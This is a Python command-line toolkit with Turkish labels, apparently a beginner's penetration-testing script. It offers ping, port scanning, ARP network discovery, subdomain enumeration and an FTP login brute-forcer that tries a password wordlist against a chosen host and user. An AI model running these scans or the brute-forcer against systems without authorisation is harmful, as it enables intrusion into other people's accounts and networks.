from scapy.all import ARP, Ether, srp
import socket
from datetime import datetime
import sys
import os
import ftplib
import requests
from colorama import Fore, init


def banner():
    print(""" 
    
                   _                 _ 
                  | |               | |
  ___   ___   ___ | |_  ___    ___  | |
 / __| / _ \ / __|| __|/ _ \  / _ \ | |
 \__ \|  __/| (__ | |_| (_) || (_) || |
 |___/ \___| \___| \__|\___/  \___/ |_|
 
                           
                Hazırlayan: Deniz Eren Korkmaz                                                       

                """)
    pass

banner()

def program():
    print("----------HOSGELDIN----------")
    print(str(datetime.now()))
    print("-----------------------------")
    print("""
 Program Kullanimi:
 python3 sect.py <parametre> <arguman>
 python3 sect.py -p 192.168.1.87   
 
 -p  ping
 -P  port 
 -m  ag 
 -s  subdomain
 -f  ftp-bruteforce
           
        """)
    sys.exit()

def port_tarama(a):
    ip = socket.gethostbyname(a)
    print("--------><-------\n KOLAY GELSIN..")
    print("hedef taraniyor... " + ip)
    print("X" * 50)
    print("baslama zamani:" + str(datetime.now()))
    print("X" * 50)
    try:
        for port in range(1, 1001):
            soket = socket.socket()
            socket.setdefaulttimeout(1)
            sonuc = soket.connect_ex((ip,port))
            if sonuc == 0:
                if port == 21:
                    print("PORT ACIK(FTP):" + str(port))
                elif port == 22:
                    print("PORT ACIK(ssh):" + str(port))
                elif port == 80:
                    print("PORT ACIK(http):" + str(port))
                else:
                    print("port acik: " + str(port))
            soket.close()
    except KeyboardInterrupt:
        print("\n cikis yapiliyor..")
        socket.setdefaulttimeout(1)
        sys.exit()
    except socket.gaierror:
        print("ip adresi donusturulemedi")
        sys.exit()
    except socket.error:
        print("sunucuya baglanamadi")
        sys.exit()

def ping(a):
    ip = socket.gethostbyname(a)
    cevap = os.system("ping -c 1 " + ip)
    if cevap == 0:
        print(ip, "+")
    else:
        print(ip, "-")

def ag_tarama(a):
    ip = a
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paket = ether / arp
    sonuc = srp(paket, timeout=3, verbose=0)[0]
    cihazlar = []
    for gond, al in sonuc:
        cihazlar.append({'ip': al.psrc, 'mac': al.hwsrc})
    print("Aktif cihazlar:")
    print("IP" + " " * 18 + "MAC")
    for cihaz in cihazlar:
        print("{:16}    {}".format(cihaz['ip'], cihaz['mac']))

def subdomain(domain):
    dosya = open("subdomainler.txt")
    icerik = dosya.read()
    subdomain_ler = icerik.splitlines()
    bulunanlar = []
    for subdomain in subdomain_ler:
        url = (f"http://{subdomain}.{domain}")
        try:
           requests.get(url)
        except requests.ConnectionError:
           pass
        else:
           print("[+] Bulunan subdomain_ler:", url)
           bulunanlar.append(url)
    with open("bsubd.txt", "w") as f:
       for subdomain in bulunanlar:
          print(subdomain, file=f) 
   
def crftp(k_adi,host):
    init()
    port = 21
    def dogru_mu(sifre):
       server = ftplib.FTP()
       print(f"{Fore.RED}[!] Deneniyor...", sifre, Fore.RESET)
       try:
         server.connect(host, port, timeout=5)
         server.login(k_adi, sifre)
       except ftplib.error_perm:
         return False
       else:
         print(f"{Fore.GREEN}[+] Sifre:", sifre, Fore.RESET)
         return True

    sifreler = open("password.txt").read().split("\n")
    print("Wordlist:",len(sifreler))

    for sifre in sifreler:
       if dogru_mu(sifre):
          break

if len(sys.argv) == 1:
    program()
elif len(sys.argv) == 3:
    if sys.argv[1] == "-p":
        ping(sys.argv[2])
    elif sys.argv[1] == "-P":
        port_tarama(sys.argv[2])
    elif sys.argv[1] == "-m":
        print("""ornek girdi: 
              python main.py -m 192.168.1.1/24
                         """)
        ag_tarama(sys.argv[2])
    elif sys.argv[1] == "-s":
        subdomain(sys.argv[2])
elif len(sys.argv) == 4:
    if sys.argv[1] == "-f":
        crftp(sys.argv[2],sys.argv[3])
